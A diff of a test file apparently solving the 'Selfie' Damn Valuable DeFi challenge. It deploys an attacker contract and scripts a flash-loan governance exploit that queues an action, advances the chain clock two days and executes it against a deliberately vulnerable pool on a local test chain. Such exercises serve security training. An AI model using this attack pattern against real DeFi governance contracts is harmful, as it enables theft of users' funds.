@@ -14,6 +14,7 @@ describe('[Challenge] Selfie', function () {
         const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
         const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
         const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
+        const SelfiePoolAttackerFactory = await ethers.getContractFactory('SelfiePoolAttacker', attacker);
 
         this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
         this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
@@ -24,13 +25,32 @@ describe('[Challenge] Selfie', function () {
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
+        this.attackerContract = await SelfiePoolAttackerFactory.connect(attacker).deploy(
+            this.pool.address,
+            this.governance.address,
+            this.token.address,
+        );
+
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.equal(TOKENS_IN_POOL);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        let tx;
+        let receipt;
+        tx = await this.attackerContract.attack();
+        receipt = await tx.wait();
+
+        const logs = await this.governance.filters.ActionQueued(null, this.attackerContract.address);
+        const [{ args: [actionId]}] = await this.governance.queryFilter(logs, 0);
+
+        const TWO_DAYS = 2 * 24 * 60 * 60;
+        await ethers.provider.send('evm_increaseTime', [TWO_DAYS]); 
+        await ethers.provider.send('evm_mine');
+
+        tx = await this.governance.executeAction(parseInt(actionId, 10));
+        receipt = await tx.wait();
     });
 
     after(async function () {
